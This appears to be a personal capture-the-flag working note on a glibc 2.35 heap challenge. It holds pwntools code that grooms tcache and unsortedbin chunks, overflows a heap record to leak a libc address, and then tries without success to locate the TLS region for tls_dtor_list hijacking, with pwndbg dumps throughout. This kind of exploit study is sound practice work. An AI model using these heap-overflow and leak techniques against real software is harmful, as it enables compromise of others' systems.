```py
for i in range(8):
    add_record(0x100, b"a") # chunk_pair 0 - 7. Add 8 records which size > 0x80 to delete later to get unsortedbin
add_record(0x100, b"a")     # chunk_pair 8. Add one more, closest to the Top chunk, prevent merging 
for i in range(8):          
    delete_record(i)        # delete 8 records, first 7 goes to tcachebin, last one is in unsortedbin
add_record(0x100, b"a")     # chunk_pair 0, it was previously chunk_pair 7. Now it is below (at a lower address) chunk_pair 8 

 
payload = flat(
    b"A" * 0x100,
    0,
    0x21,
    0x1,
    0x1000
)
add_record(0x100, b"b")     # chunk_pair 1, it was previously chunk_pair 6, now it is below chunk_pair 0

edit_record(1, 0x200, payload) # buffer goes up to higher address, overwrite chunk_pair 0 which is right above, by overflowing 0x100 byte size with 0x200 of bytes

gdb.attach(p, s)
print_record() # leak the addresses 

# parse the leaked glibc address 
leak = p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00') 
leak = u64(leak)
print(hex(leak))

# calculating the libc base address
libc.address = leak - 0x219ce0
print(hex(libc.address)) # got it! It is correct. Sample: 0x7f7935000000

tls = # ???  Sample: 0x7f79353ec740 (from pwndbg)
```
# leaking tls address 
Now here is the problem:
```py
tls = libc.address # Sample: 0x7f7935  {xyz}  740
```
we don't know what is `xyz`
## Bruteforce
since it goes from probably `000` to `xyz`, we can probably bruteforce it.
But what is the error message?   
Either invalid address accessing or...  
Since we are doing `tls_dtor_list hijacking`, we can perhaps bruteforce with scenarios of not getting the intended result
~~damn I am feeling alert, calm and focused right now, love it~~
~~tonight write flashcards of compilation of vulnerabilities~~
## Overflow the heap with more bytes
```py
payload = flat(
    b"A" * 0x100,
    0,
    0x21,
    0x1,
    0x1000
)
add_record(0x100, b"b")     # chunk_pair 1, it was previously chunk_pair 6, now it is below chunk_pair 0

edit_record(1, 0x200, payload)
```
here maybe overflowing with more bytes would work, but like huge ton of bytes since the offset between heap - `0x55eb408a5000` and `0x7f79353ec000` is a lot
```
0x55eb408a5000     0x55eb408c6000 rw-p    21000      0 [heap]
    0x7f7935000000     0x7f7935028000 r--p    28000      0 /home/kali/Desktop/CTF/MercuryBlast_2.35/libc.so.6
    0x7f7935028000     0x7f79351bd000 r-xp   195000  28000 /home/kali/Desktop/CTF/MercuryBlast_2.35/libc.so.6
    0x7f79351bd000     0x7f7935215000 r--p    58000 1bd000 /home/kali/Desktop/CTF/MercuryBlast_2.35/libc.so.6
    0x7f7935215000     0x7f7935219000 r--p     4000 214000 /home/kali/Desktop/CTF/MercuryBlast_2.35/libc.so.6
    0x7f7935219000     0x7f793521b000 rw-p     2000 218000 /home/kali/Desktop/CTF/MercuryBlast_2.35/libc.so.6
    0x7f793521b000     0x7f7935228000 rw-p     d000      0 [anon_7f793521b]
    0x7f79353ec000     0x7f79353f1000 rw-p     5000      0 [anon_7f79353ec]
```
But since we are able to leak something like `0x7f7935219ce0`, which is something at `0x7f7935219000`, maybe the offset between `0x7f79353ec000` and `0x7f7935219000` is fixed?! Let's see:  

### `1d3`
```
pwndbg> x/x 0x7f79353ec000 - 0x7f7935219000
0x1d3000:	Cannot access memory at address 0x1d3000
```

### `1ee`
```
pwndbg> x/x 0x7ff9a8207000 - 0x7ff9a8019000
0x1ee000:	Cannot access memory at address 0x1ee000
```
nvm...


# Let take a look at the addresses first 
```
pwndbg> tele 0x7ff3aebd36e8 20
00:0000│  0x7ff3aebd36e8 ◂— 0
01:0008│  0x7ff3aebd36f0 ◂— 0
02:0010│  0x7ff3aebd36f8 —▸ 0x55da06afb010 ◂— 5
03:0018│  0x7ff3aebd3700 ◂— 0
04:0020│  0x7ff3aebd3708 —▸ 0x7ff3aea19c80 ◂— 0
05:0028│  0x7ff3aebd3710 ◂— 0
... ↓     5 skipped
0b:0058│  0x7ff3aebd3740 ◂— 0x7ff3aebd3740
0c:0060│  0x7ff3aebd3748 —▸ 0x7ff3aebd4160 ◂— 1
0d:0068│  0x7ff3aebd3750 —▸ 0x7ff3aebd3740 ◂— 0x7ff3aebd3740
0e:0070│  0x7ff3aebd3758 ◂— 0
0f:0078│  0x7ff3aebd3760 ◂— 0
10:0080│  0x7ff3aebd3768 ◂— 0x383e20e4db573e00
11:0088│  0x7ff3aebd3770 ◂— 0xb0beb24c342f373
12:0090│  0x7ff3aebd3778 ◂— 0
13:0098│  0x7ff3aebd3780 ◂— 0
```
`00:0000│  0x7ff3aebd36e8 ◂— 0` is fs:[-0x58], what we need to overwrite
`0b:0058│  0x7ff3aebd3740 ◂— 0x7ff3aebd3740` is the base of fs, fs:[0x0]

I give up, can't brute force

